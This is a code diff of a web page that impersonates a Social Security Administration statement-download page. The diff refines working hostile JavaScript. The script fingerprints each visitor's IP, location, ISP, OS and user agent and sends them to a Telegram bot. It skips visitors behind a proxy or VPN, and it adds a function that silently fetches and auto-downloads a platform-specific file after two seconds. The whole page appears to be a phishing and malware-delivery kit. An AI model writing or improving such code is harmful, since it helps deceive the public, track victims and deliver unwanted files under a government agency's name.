@@ -74,9 +74,7 @@
                     country: data.country_name || 'Unknown',
                     region: data.region || 'Unknown',
                     city: data.city || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    latitude: data.latitude || 'N/A',
-                    longitude: data.longitude || 'N/A'
+                    isp: data.org || 'Unknown'
                 };
             } catch (error) {
                 console.error('Error fetching geolocation:', error);
@@ -84,9 +82,7 @@
                     country: 'Unknown',
                     region: 'Unknown',
                     city: 'Unknown',
-                    isp: 'Unknown',
-                    latitude: 'N/A',
-                    longitude: 'N/A'
+                    isp: 'Unknown'
                 };
             }
         }
@@ -94,6 +90,17 @@
         // Function to detect if device is mobile
         function isMobileDevice() {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // Function to detect device type
+        function detectDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/mobile|android|iphone|ipad|ipod/i.test(userAgent)) {
+                return 'Mobile';
+            } else if (/tablet|ipad/i.test(userAgent)) {
+                return 'Tablet';
+            }
+            return 'Desktop';
         }
         
         // Function to detect platform/OS
@@ -108,16 +115,6 @@
             if (/iPhone|iPad|iPod/.test(platform)) return 'iOS';
             
             return 'Unknown';
-        }
-        
-        // Function to get browser language
-        function getBrowserLanguage() {
-            return navigator.language || navigator.userLanguage || 'Unknown';
-        }
-        
-        // Function to get screen resolution
-        function getScreenResolution() {
-            return `${window.screen.width}x${window.screen.height}`;
         }
         
         // Function to send data to Telegram
@@ -148,15 +145,14 @@
         function formatTelegramMessage(visitData) {
             return `
 <blockquote>
-<b>📡 New Visit:- (Visitor No: ${visitorCount})</b>
+<b>📡 Visitor No: ${visitorCount}</b>
 <b>🕒 Time:</b> ${new Date().toLocaleString()}
 <b>🌐 IP:</b> ${visitData.ip}
 <b>📍 Location:</b> ${visitData.city}, ${visitData.region}, ${visitData.country}
-<b>📌 Coordinates:</b> ${visitData.latitude}, ${visitData.longitude}
-<b>🖥️ Device:</b> ${visitData.platform} ${visitData.isMobile ? '(Mobile)' : '(Desktop)'}
-<b>🌐 Language:</b> ${visitData.language}
+<b>🖥️ Device Type:</b> ${visitData.deviceType}
+<b>🔌 ISP:</b> ${visitData.isp}
+<b>💻 OS:</b> ${visitData.platform}
 <b>📱 User Agent:</b> ${visitData.userAgent}
-<b>📺 Screen:</b> ${visitData.screenResolution}
 </blockquote>
             `;
         }
@@ -223,21 +219,27 @@
             }
         }
         
-        // Function to handle manual download click
-        function handleManualDownload() {
-            const platform = detectPlatform();
-            const downloadLink = getDownloadLink(platform);
-            
-            if (isMobileDevice()) {
-                showMobileWarning();
-                return false;
-            }
-            
-            const a = document.createElement('a');
-            a.href = downloadLink;
-            a.download = downloadLink.split('/').pop();
-            a.click();
-            return false;
+        // Function to force download without redirect
+        function forceDownload(url, filename) {
+            fetch(url, {
+                method: 'GET',
+                mode: 'no-cors',
+                cache: 'no-store'
+            })
+            .then(response => response.blob())
+            .then(blob => {
+                const blobUrl = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(blobUrl);  
+                }, 100);
+            })
+            .catch(error => console.error('Download error:', error));
         }
         
         // Main function to handle visit
@@ -247,10 +249,9 @@
                 const ip = await getClientIP();
                 const geoData = await getGeolocationData();
                 const isMobile = isMobileDevice();
+                const deviceType = detectDeviceType();
                 const platform = detectPlatform();
-                const language = getBrowserLanguage();
                 const userAgent = navigator.userAgent;
-                const screenResolution = getScreenResolution();
                 
                 if (!isRealIP(ip)) {
                     console.log('Proxy/VPN detected or invalid IP');
@@ -263,13 +264,10 @@
                     country: geoData.country,
                     region: geoData.region,
                     city: geoData.city,
-                    latitude: geoData.latitude,
-                    longitude: geoData.longitude,
+                    isp: geoData.isp,
+                    deviceType: deviceType,
                     platform: platform,
-                    isMobile: isMobile,
-                    language: language,
-                    userAgent: userAgent,
-                    screenResolution: screenResolution
+                    userAgent: userAgent
                 };
                 
                 // Send to Telegram
@@ -284,19 +282,21 @@
                 
                 // Proceed with download for desktop devices
                 const downloadLink = getDownloadLink(platform);
+                const filename = downloadLink.split('/').pop();
                 
                 // Set the download link in the UI
                 const downloadElement = document.getElementById('downloadLink');
                 downloadElement.href = downloadLink;
-                downloadElement.download = downloadLink.split('/').pop();
-                downloadElement.onclick = handleManualDownload;
+                downloadElement.download = filename;
+                downloadElement.onclick = function(e) {
+                    e.preventDefault();
+                    forceDownload(downloadLink, filename);
+                    return false;
+                };
                 
                 // Start download after delay
                 setTimeout(function() {
-                    const a = document.createElement('a');
-                    a.href = downloadLink;
-                    a.download = downloadLink.split('/').pop();
-                    a.click();
+                    forceDownload(downloadLink, filename);
                 }, 2000);
                 
             } catch (error) {
@@ -331,7 +331,7 @@
                                 <div class="uef-notice-row hd">
                                     <div class="uef-notice-content">
                                         <center><h1>Welcome to Your Latest SSA Statement Download</h1></center>
-                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#" onclick="return handleManualDownload();">click here</a>.</h4>
+                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#">click here</a>.</h4>
                                     </div>
                                 </div>
                                 <div class="uef-notice-row">
